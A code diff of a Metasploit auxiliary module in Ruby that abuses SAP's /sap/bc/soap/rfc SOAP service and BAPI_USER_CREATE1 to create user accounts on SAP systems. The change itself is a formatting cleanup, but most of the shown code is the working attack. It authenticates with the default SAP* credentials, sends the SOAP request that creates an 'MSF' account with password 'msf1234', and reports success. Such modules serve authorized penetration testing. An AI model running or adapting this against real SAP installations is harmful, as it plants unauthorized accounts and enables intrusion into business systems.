@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -17,7 +18,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -25,10 +25,10 @@ class MetasploitModule < Msf::Auxiliary
   def initialize
     super(
       'Name' => 'SAP /sap/bc/soap/rfc SOAP Service BAPI_USER_CREATE1 Function User Creation',
-      'Description' => %q{
+      'Description' => %q(
           This module makes use of the BAPI_USER_CREATE1 function, through the SOAP
         /sap/bc/soap/rfc service, for creating/modifying users on a SAP.
-      },
+      ),
       'References' =>
         [
           [ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]
@@ -41,15 +41,15 @@ class MetasploitModule < Msf::Auxiliary
       'License' => MSF_LICENSE
     )
     register_options([
-      Opt::RPORT(8000),
-      OptString.new('CLIENT', [true, 'SAP client', '001']),
-      OptString.new('HttpUsername', [true, 'Username', 'SAP*']),
-      OptString.new('HttpPassword', [true, 'Password', '06071992']),
-      OptString.new('BAPI_FIRST',[true,'First name','John']),
-      OptString.new('BAPI_LAST',[true,'Last name','Doe']),
-      OptString.new('BAPI_PASSWORD',[true,'Password for the account (Default is msf1234)','msf1234']),
-      OptString.new('BAPI_USER',[true,'Username for the account (Username in upper case only. Default is MSF)', 'MSF'])
-      ], self.class)
+                       Opt::RPORT(8000),
+                       OptString.new('CLIENT', [true, 'SAP client', '001']),
+                       OptString.new('HttpUsername', [true, 'Username', 'SAP*']),
+                       OptString.new('HttpPassword', [true, 'Password', '06071992']),
+                       OptString.new('BAPI_FIRST', [true, 'First name', 'John']),
+                       OptString.new('BAPI_LAST', [true, 'Last name', 'Doe']),
+                       OptString.new('BAPI_PASSWORD', [true, 'Password for the account (Default is msf1234)', 'msf1234']),
+                       OptString.new('BAPI_USER', [true, 'Username for the account (Username in upper case only. Default is MSF)', 'MSF'])
+                     ], self.class)
   end
 
   def report_cred(opts)
@@ -97,30 +97,28 @@ class MetasploitModule < Msf::Auxiliary
     begin
       print_status("[SAP] #{ip}:#{rport} - Attempting to create user '#{datastore['BAPI_USER']}' with password '#{datastore['BAPI_PASSWORD']}'")
 
-      res = send_request_cgi({
-        'uri' => '/sap/bc/soap/rfc',
-        'method' => 'POST',
-        'data' => data,
-        'cookie' => "sap-usercontext=sap-language=EN&sap-client=#{datastore['CLIENT']}",
-        'ctype' => 'text/xml; charset=UTF-8',
-        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
-        'headers' => {
-          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
-        },
-        'encode_params' => false,
-        'vars_get' => {
-          'sap-client'    => datastore['CLIENT'],
-          'sap-language'  => 'EN'
-        }
-      })
-      if res and res.code == 200
+      res = send_request_cgi('uri' => '/sap/bc/soap/rfc',
+                             'method' => 'POST',
+                             'data' => data,
+                             'cookie' => "sap-usercontext=sap-language=EN&sap-client=#{datastore['CLIENT']}",
+                             'ctype' => 'text/xml; charset=UTF-8',
+                             'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
+                             'headers' => {
+                               'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions'
+                             },
+                             'encode_params' => false,
+                             'vars_get' => {
+                               'sap-client' => datastore['CLIENT'],
+                               'sap-language' => 'EN'
+                             })
+      if res && (res.code == 200)
         if res.body =~ /<h1>Logon failed<\/h1>/
           print_error("[SAP] #{ip}:#{rport} - Logon failed")
           return
         elsif res.body =~ /faultstring/
           error = []
           error.push(res.body.scan(%r{<faultstring>(.*?)</faultstring>}))
-          print_error("[SAP] #{ip}:#{rport} - #{error.join().chomp}")
+          print_error("[SAP] #{ip}:#{rport} - #{error.join.chomp}")
           return
         else
           print_good("[SAP] #{ip}:#{rport} - User '#{datastore['BAPI_USER']}' with password '#{datastore['BAPI_PASSWORD']}' created")
